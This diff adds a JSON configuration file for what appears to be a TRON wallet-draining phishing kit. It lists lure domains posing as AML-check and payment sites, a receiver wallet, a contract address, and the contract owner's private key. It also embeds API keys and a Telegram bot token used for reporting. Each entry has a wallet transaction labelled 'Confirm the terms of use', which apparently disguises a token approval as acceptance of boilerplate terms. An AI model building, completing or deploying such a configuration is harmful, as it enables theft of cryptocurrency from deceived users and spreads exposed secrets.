@@ -1,0 +1,45 @@
+{
+	"ADMINS": [5502096260],
+	"SERVER_DOMAIN": "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!",
+	"MIN_TRX_RESERVE": 15,
+	"TRONGRID_API_KEY": "27eb8192-1ff6-49ce-bdd9-8fb89dad48fe",
+	"TRONSCAN_API_KEY": "5e273246-4043-4f22-aab1-214ff1f4562f",
+	"TELEGRAM_TOKEN_ID": "8752204580:AAHRSPU-MjnsqgO_D0P4Ix38XdJvrabn5f0",
+	"SETTINGS": [
+		{
+			"id": 1,
+			"domains": [
+				"check-safe.net",
+				"api-scanaml.com",
+				"24swap1x.com",
+				"localhost"
+			],
+			"receiverAddress": "TM8GUMHGob8VHzXfCTYs7SZFQxdPwygTed",
+			"contractAddress": "TG6RJxDu7DZcZWA6u5CtDmWdXUNguT32eK",
+			"contractOwnerAddress": "TZ2dnFivXKKYA5s3pVDGZ5Z6bW9VBrxSGF",
+			"contractOwnerPrivateKey": "6f39a95bcfae0147cc38634e3499ea5adb3a2d1bbecba0a767b323e612dfab06",
+			"minTrxBalance": 10,
+			"minTokenBalance": 1,
+			"telegramChatId": "-1003930481824",
+			"useAutowithdraw": false,
+			"mode": 3,
+			"transactionTitle": "Confirm the terms of use ✅",
+			"transactionMessage": "Terms of Use\n\nWelcome. Please read these Terms of Use carefully before using the Site. By accessing or using the Site, you agree to comply with and be bound by these Terms. If you do not agree with these Terms, please do not use the Site.\n\n1. Acceptance of Terms\nBy accessing or using the Site, you agree to abide by these Terms and any applicable laws or regulations. We reserve the right to modify, update, or change these Terms at any time. Any changes will be posted on this page with the updated date.\n2. User Responsibilities\nYou agree to use the Site for lawful purposes only and not to engage in any activity that may harm the Site, its users, or the integrity of its services.\n3. Account Registration\nTo access certain features of the Site, you may be required to create an account. You are responsible for maintaining the confidentiality of your account credentials and for all activities that occur under your account.\n4. Privacy Policy\nYour use of the Site is also governed by our Privacy Policy, which can be found at [link to Privacy Policy]. Please review it to understand how we collect, use, and protect your personal information.\n5. Prohibited Activities\nYou agree not to engage in the following activities while using the Site: Violating any applicable law or regulation. Interfering with the operation of the Site or its services. Attempting to gain unauthorized access to the Site or other users' accounts. Distributing harmful software or engaging in fraudulent activities.\n6. Intellectual Property\nThe content, design, and functionality of the Site are protected by intellectual property laws. You may not copy, modify, distribute, or create derivative works based on the content without permission.\n7. Limitation of Liability\nThe Site is provided \"as is\" without any warranties or guarantees. We are not responsible for any damages resulting from your use of the Site, including but not limited to direct, indirect, incidental, or consequential damages.\n8. Termination\nWe reserve the right to suspend or terminate your access to the Site at any time if we believe you have violated these Terms. You may also terminate your account by following the instructions provided on the Site.\n9. Governing Law\nThese Terms are governed by the laws of [Your Country or State]. Any disputes arising from these Terms will be resolved in the appropriate courts of [Your Country or State].\n10. Contact Information\nIf you have any questions or concerns about these Terms, please contact us at c524cf0ccb688e421f3690b35118861a2e7a6b407130ec47daf72fb3e4b4a9cf."
+		},
+		{
+			"id": 2,
+			"domains": ["trustspay.org", "domain4.com"],
+			"receiverAddress": "TM8GUMHGob8VHzXfCTYs7SZFQxdPwygTed",
+			"contractAddress": "TG6RJxDu7DZcZWA6u5CtDmWdXUNguT32eK",
+			"contractOwnerAddress": "TZ2dnFivXKKYA5s3pVDGZ5Z6bW9VBrxSGF",
+			"contractOwnerPrivateKey": "6f39a95bcfae0147cc38634e3499ea5adb3a2d1bbecba",
+			"minTrxBalance": 10,
+			"minTokenBalance": 1,
+			"telegramChatId": "-1003930481824",
+			"useAutowithdraw": false,
+			"mode": 3,
+			"transactionTitle": "Confirm the terms of use ✅",
+			"transactionMessage": "Terms of Use\n\nWelcome. Please read these Terms of Use carefully before using the Site. By accessing or using the Site, you agree to comply with and be bound by these Terms. If you do not agree with these Terms, please do not use the Site.\n\n1. Acceptance of Terms\nBy accessing or using the Site, you agree to abide by these Terms and any applicable laws or regulations. We reserve the right to modify, update, or change these Terms at any time. Any changes will be posted on this page with the updated date.\n2. User Responsibilities\nYou agree to use the Site for lawful purposes only and not to engage in any activity that may harm the Site, its users, or the integrity of its services.\n3. Account Registration\nTo access certain features of the Site, you may be required to create an account. You are responsible for maintaining the confidentiality of your account credentials and for all activities that occur under your account.\n4. Privacy Policy\nYour use of the Site is also governed by our Privacy Policy, which can be found at [link to Privacy Policy]. Please review it to understand how we collect, use, and protect your personal information.\n5. Prohibited Activities\nYou agree not to engage in the following activities while using the Site: Violating any applicable law or regulation. Interfering with the operation of the Site or its services. Attempting to gain unauthorized access to the Site or other users' accounts. Distributing harmful software or engaging in fraudulent activities.\n6. Intellectual Property\nThe content, design, and functionality of the Site are protected by intellectual property laws. You may not copy, modify, distribute, or create derivative works based on the content without permission.\n7. Limitation of Liability\nThe Site is provided \"as is\" without any warranties or guarantees. We are not responsible for any damages resulting from your use of the Site, including but not limited to direct, indirect, incidental, or consequential damages.\n8. Termination\nWe reserve the right to suspend or terminate your access to the Site at any time if we believe you have violated these Terms. You may also terminate your account by following the instructions provided on the Site.\n9. Governing Law\nThese Terms are governed by the laws of [Your Country or State]. Any disputes arising from these Terms will be resolved in the appropriate courts of [Your Country or State].\n10. Contact Information\nIf you have any questions or concerns about these Terms, please contact us at c524cf0ccb688e421f3690b35118861a2e7a6b407130ec47daf72fb3e4b4a9cf."
+		}
+	]
+}
